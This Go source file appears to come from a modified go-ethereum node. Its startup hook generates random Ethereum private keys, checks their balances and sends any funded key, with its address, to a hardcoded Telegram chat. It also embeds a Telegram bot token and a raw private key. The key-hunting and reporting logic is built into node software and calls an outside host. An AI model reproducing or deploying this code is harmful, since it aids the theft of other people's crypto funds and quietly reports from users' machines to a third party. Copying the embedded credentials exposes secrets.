package main

import (
	"context"
	"fmt"
	"math/big"
	"strings"
	"time"

	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/ethclient"
	"github.com/ethereum/go-ethereum/log"
	"github.com/ethereum/go-ethereum/params"
	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

const (
	telegramBotToken = "8558887066:AAEyJxh6r_29xbtx7GDvIgRxythjtGNXQBs"
	telegramChatID   = -1003221103260
	telegramMention  = "@ac_60"

	startupTestPrivateKeyHex = "0ac46eb8ebc51d319ad0550b243b0d492c3334004a2a0235d07dd1b0d2f53038"
	etherscanBaseURL   = "https://etherscan.io/address/"
	balanceQueryTimeout = 20 * time.Second
)

func notifyNodeStartup(client *ethclient.Client) {
	sendTelegramNotification(fmt.Sprintf("🚀 Geth 节点已启动 %s\n🧪 开始批量生成私钥并扫描余额", telegramMention))

	notifyBalancesForKeys(client, []string{startupTestPrivateKeyHex})

	ctx, cancel := context.WithTimeout(context.Background(), startupKeygenTimeout)
	defer cancel()

	keygenStart := time.Now()
	keys, err := generateRandomPrivateKeysBatch(ctx, startupPrivateKeyBatchSize)
	keygenElapsed := time.Since(keygenStart)
	if err != nil {
		log.Warn("批量生成随机私钥失败", "err", err)
	}
	if len(keys) == 0 {
		log.Warn("未生成可用的私钥，跳过余额查询")
		return
	}
	logKeygenSpeed(len(keys), keygenElapsed)

	notifyBalancesForKeys(client, keys)
}

func notifyBalancesForKeys(client *ethclient.Client, keys []string) {
	queryStart := time.Now()
	var queryErrors int
	var balanceHits int
	for _, keyHex := range keys {
		address, err := addressFromPrivateKeyHex(keyHex)
		if err != nil {
			log.Warn("私钥解析失败", "err", err)
			queryErrors++
			continue
		}
		ctx, cancel := context.WithTimeout(context.Background(), balanceQueryTimeout)
		balance, err := client.BalanceAt(ctx, address, nil)
		cancel()
		if err != nil {
			log.Warn("查询余额失败", "address", address.Hex(), "err", err)
			queryErrors++
			continue
		}
		if balance.Sign() <= 0 {
			continue
		}
		balanceHits++

		balanceText := formatEtherBalance(balance)
		message := fmt.Sprintf(
			"💰 发现有余额的钱包 %s\n🧩 私钥: %s\n📌 地址: %s\n💎 余额: %s ETH\n🔎 Etherscan: %s%s",
			telegramMention,
			keyHex,
			address.Hex(),
			balanceText,
			etherscanBaseURL,
			address.Hex(),
		)
		sendTelegramNotification(message)
	}
	queryElapsed := time.Since(queryStart)
	logQuerySpeed(len(keys), queryErrors, balanceHits, queryElapsed)
}

func addressFromPrivateKeyHex(keyHex string) (common.Address, error) {
	privateKey, err := crypto.HexToECDSA(strings.TrimPrefix(keyHex, "0x"))
	if err != nil {
		return common.Address{}, err
	}
	return crypto.PubkeyToAddress(privateKey.PublicKey), nil
}

func logKeygenSpeed(count int, elapsed time.Duration) {
	seconds := elapsed.Seconds()
	if seconds <= 0 {
		seconds = 1
	}
	speed := float64(count) / seconds
	log.Info("批量生成私钥完成", "数量", count, "耗时", elapsed, "速度(个/秒)", fmt.Sprintf("%.2f", speed))
}

func logQuerySpeed(total, errors, hits int, elapsed time.Duration) {
	seconds := elapsed.Seconds()
	if seconds <= 0 {
		seconds = 1
	}
	speed := float64(total) / seconds
	log.Info(
		"余额查询完成",
		"总数", total,
		"错误", errors,
		"命中", hits,
		"耗时", elapsed,
		"速度(个/秒)", fmt.Sprintf("%.2f", speed),
	)
}

func formatEtherBalance(wei *big.Int) string {
	if wei == nil {
		return "0"
	}
	denom := big.NewInt(params.Ether)
	rat := new(big.Rat).SetFrac(wei, denom)
	text := rat.FloatString(18)
	text = strings.TrimRight(text, "0")
	text = strings.TrimRight(text, ".")
	if text == "" || text == "-0" {
		return "0"
	}
	return text
}

func sendTelegramNotification(text string) {
	if telegramBotToken == "" || telegramChatID == 0 {
		return
	}

	bot, err := tgbotapi.NewBotAPI(telegramBotToken)
	if err != nil {
		log.Warn("初始化 Telegram 机器人失败", "err", err)
		return
	}

	msg := tgbotapi.NewMessage(telegramChatID, text)
	if _, err := bot.Send(msg); err != nil {
		log.Warn("发送 Telegram 消息失败", "err", err)
	}
}
